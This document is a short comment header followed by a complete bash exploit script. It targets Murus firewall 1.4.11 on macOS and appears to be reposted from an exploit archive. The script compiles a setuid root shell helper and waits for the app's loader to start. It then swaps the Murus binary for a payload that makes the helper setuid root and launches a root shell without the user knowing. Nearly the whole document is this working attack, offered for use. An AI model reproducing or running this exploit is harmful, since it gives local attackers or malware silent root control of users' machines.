# I recently blogged about the prevalence of escalation hijack vulnerabilities amongst macOS applications. One example of this is the latest version of Murus
# firewall. By design it requires the user to authenticate every time in order to obtain the access it needs to modify the firewall settings.
  
# If a local attacker or malware is running as an admin user (ie has write access to /Applications/) they can subvert this process to silently obtain root access
# without the user knowing.
  
# https://m4.rkw.io/murus1.4.11.sh.txt
# 9c332c07747e11c78c34f9dc8d30127250d95edd5e58a571ed1a005eafd32301
# -------------------------------------------------------------------------------
#!/bin/bash
  
##################################################################
###### Murus 1.4.11 local root privilege escalation exploit ######
###### by m4rkw - https://m4.rkw.io/blog.html               ######
##################################################################
  
echo "compiling payloads..."
  
cat > /tmp/murus411_exp.c <<EOF
#include <unistd.h>
int main()
{
  setuid(0);
  seteuid(0);
  execl("/bin/bash","bash","-c","rm -f /tmp/murus411_exp; /bin/bash",NULL);
  return 0;
}
EOF
  
gcc -o /tmp/murus411_exp /tmp/murus411_exp.c
  
if [ ! $? -eq 0 ] ; then
  rm -f /tmp/murus411_exp.c
    echo "failed to compile, dev tools may not be installed"
  exit 1
fi
  
rm -f /tmp/murus411_exp.c
  
cat > /tmp/murus411_exp2.c <<EOF
#include <unistd.h>
#include <stdlib.h>
int main()
{
  setuid(0);
  seteuid(0);
  system("chown root:wheel /tmp/murus411_exp");
  system("chmod 4755 /tmp/murus411_exp");
  system("mv /Applications/Murus.app/Contents/MacOS/Murus.orig /Applications/\
Murus.app/Contents/MacOS/Murus");
  execl("/Applications/Murus.app/Contents/MacOS/Murus","Murus",NULL);
  return 0;
}
EOF
  
gcc -o /tmp/murus411_exp2 /tmp/murus411_exp2.c
rm -f /tmp/murus411_exp2.c
  
echo "waiting for loader..."
  
while :
do
  ps auxwww |grep '/Applications/Murus.app/Contents/MacOS/MurusLoader' \
    |grep -v grep 1>/dev/null
  if [ $? -eq 0 ] ; then
    break
  fi
done
  
echo "planting payload..."
  
mv /Applications/Murus.app/Contents/MacOS/Murus /Applications/Murus.app/\
Contents/MacOS/Murus.orig
mv /tmp/murus411_exp2 /Applications/Murus.app/Contents/MacOS/Murus
  
echo "waiting for payload to trigger..."
  
while :
do
  r=`ls -la /tmp/murus411_exp |grep root`
  if [ "$r" != "" ] ; then
    break
  fi
  sleep 0.1
done
  
echo "kapow"
  
/tmp/murus411_exp
 
#  0day.today [2023-02-20]  #
